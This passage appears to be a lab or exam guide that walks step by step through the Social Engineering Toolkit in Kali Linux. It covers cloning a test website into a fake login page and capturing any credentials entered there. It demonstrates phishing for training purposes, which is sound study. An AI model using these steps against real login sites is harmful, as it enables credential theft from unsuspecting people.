### Steps:

1. Click **Kali Menu**
2. Go to **Exploitation Tools**
3. Click **Social Engineering Toolkit**
4. Terminal opens → type **Enter**

You’ll see the SET main menu ✅

---

## STEP 3️⃣: Choose Social Engineering Attack

In SET terminal, select:

```text
1) Social-Engineering Attacks
```

👉 Press **1** → Enter

---

## STEP 4️⃣: Website Attack Vectors

Next menu:

```text
2) Website Attack Vectors
```

👉 Press **2** → Enter

---

## STEP 5️⃣: Credential Harvester Attack

Next option:

```text
3) Credential Harvester Attack Method
```

👉 Press **3** → Enter

---

## STEP 6️⃣: Site Cloner

Choose:

```text
2) Site Cloner
```

👉 Press **2** → Enter

---

## STEP 7️⃣: Enter Attacker IP Address

SET will ask:

```text
Enter the IP address for the POST back
```

### Find your IP:

Open **new terminal** and type:

```bash
ip a
```

Example:

```text
192.168.56.101
```

👉 Enter this IP in SET

---

## STEP 8️⃣: Enter Website to Clone

SET will ask:

```text
Enter the URL to clone
```

Example (for demo):

```text
http://testphp.vulnweb.com
```

⚠️ **Do NOT use real login websites in exams**

---

## STEP 9️⃣: Attack Running (Demo Mode)

* SET clones the website
* Creates a fake login page
* Starts listening for credentials

If someone enters credentials on cloned page →
They appear in the SET terminal

---

## 📌 Observation

* Website successfully cloned
* Login credentials captured (demo)
* Social engineering attack simulated

---
